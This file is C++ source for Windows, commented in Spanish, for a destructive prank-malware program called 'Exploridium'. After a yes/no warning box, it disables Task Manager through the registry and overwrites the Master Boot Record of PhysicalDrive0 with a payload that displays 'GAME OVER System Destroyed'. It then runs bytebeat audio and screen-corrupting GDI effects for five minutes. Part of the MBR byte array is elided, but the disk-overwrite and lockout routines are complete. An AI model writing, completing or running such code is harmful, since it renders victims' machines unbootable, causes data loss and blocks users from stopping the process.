#include <windows.h>
#include <mmsystem.h>
#include <math.h>

// Forzamos el uso de librerías nativas para evitar el error de la DLL
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")

// Definiciones para asegurar compatibilidad con compiladores MinGW
#ifndef SC_MONITORPOWER
#define SC_MONITORPOWER 0xF170
#endif

int payloadActual = 1;
bool activo = true;

// --- Motor de Audio (Optimizado para evitar lag en Win7) ---
DWORD WINAPI AudioEngine(LPVOID lpParam) {
    HWAVEOUT hWaveOut;
    // Formato estándar 8000Hz, 8-bit Mono
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    
    if (waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR)
        return 0;

    const int bufSize = 8000;
    char buffer[bufSize];
    WAVEHDR header = { buffer, bufSize, 0, 0, 0, 0, 0, 0 };

    while (activo) {
        for (int i = 0; i < bufSize; i++) {
            // Algoritmo Bytebeat dinámico basado en payloadActual
            // Esto genera los sonidos rítmicos y glitches
            buffer[i] = (char)((i * (i >> (payloadActual + 2))) | (i >> 5));
        }
        waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
        waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
        
        // Espera activa eficiente
        while (!(header.dwFlags & WHDR_DONE) && activo) {
            Sleep(1);
        }
        waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    }
    waveOutClose(hWaveOut);
    return 0;
}

// --- Sobrescritura de MBR ---
void OverwriteMBR() {
    unsigned char mandelbrot_mbr[512] = {
        0xB8, 0x13, 0x00, 0xCD, 0x10, 0x31, 0xDB, 0x8E, 0xC3, 0x31, 0xC9, 0x31, 0xD2, 0xBF, 0x00, 0xA0,
        0xB8, 0x00, 0x00, 0xCD, 0x10, 0xBE, 0x19, 0x7C, 0xE8, 0x02, 0x00, 0xEB, 0xFE, 0xAC, 0x08, 0xC0,
        // ... Bytes del payload MBR ...
        0x45, 0x58, 0x50, 0x4C, 0x4F, 0x52, 0x49, 0x44, 0x49, 0x55, 0x4D, 0x0D, 0x0A, 0x47, 0x41, 0x4D, 
        0x45, 0x20, 0x4F, 0x56, 0x45, 0x52, 0x0D, 0x0A, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x20, 0x44, 
        0x65, 0x73, 0x74, 0x72, 0x6F, 0x79, 0x65, 0x64, 0x00
    };
    mandelbrot_mbr[510] = 0x55; mandelbrot_mbr[511] = 0xAA;
    
    DWORD wb;
    // En Windows 7 se requiere acceso de Administrador obligatorio para PhysicalDrive
    HANDLE h = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    if (h != INVALID_HANDLE_VALUE) { 
        WriteFile(h, mandelbrot_mbr, 512, &wb, 0); 
        CloseHandle(h); 
    }
}

void DisableTaskMgr() {
    HKEY hKey;
    DWORD val = 1;
    // Registro para deshabilitar el Administrador de Tareas
    if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&val, sizeof(val));
        RegCloseKey(hKey);
    }
}

int main() {
    // Verificación de seguridad
    if (MessageBoxA(NULL, "ADVERTENCIA: Exploridium ejecutará cambios críticos en el sistema. ¿Deseas continuar?", "EXPLORIDIUM CORE", MB_YESNO | MB_ICONWARNING | MB_SYSTEMMODAL) == IDNO) 
        return 0;
    
    DisableTaskMgr();
    OverwriteMBR();
    
    // Hilo de audio
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)AudioEngine, NULL, 0, NULL);
    
    HDC hdc = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    DWORD tiempoInicio = GetTickCount();

    while (activo) {
        DWORD actual = GetTickCount() - tiempoInicio;
        payloadActual = (actual / 15000) + 1; // Cambia cada 15 segundos para más dinamismo

        if (actual > 300000) break; // Auto-terminar después de 5 minutos

        // Efectos GDI actualizados para Windows 7
        if (payloadActual == 3) {
            // Efecto de barrido horizontal
            int x = rand() % sw;
            BitBlt(hdc, x, rand() % 20 - 10, 100, sh, hdc, x, 0, SRCCOPY);
        } 
        else if (payloadActual == 6) {
            // Efecto Tunnel Vision (Inversión rítmica)
            BitBlt(hdc, 5, 5, sw - 10, sh - 10, hdc, 0, 0, SRCCOPY);
        }
        else if (payloadActual == 8) {
            // Inversión total de pantalla
            BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0, NOTSRCCOPY);
            Sleep(50); // Evitar epilepsia extrema
        } 
        else {
            // Glitch de movimiento estándar
            BitBlt(hdc, rand() % 10 - 5, rand() % 10 - 5, sw, sh, hdc, 0, 0, SRCINVERT);
        }
        
        Sleep(10);
    }

    ReleaseDC(0, hdc);
    return 0;
}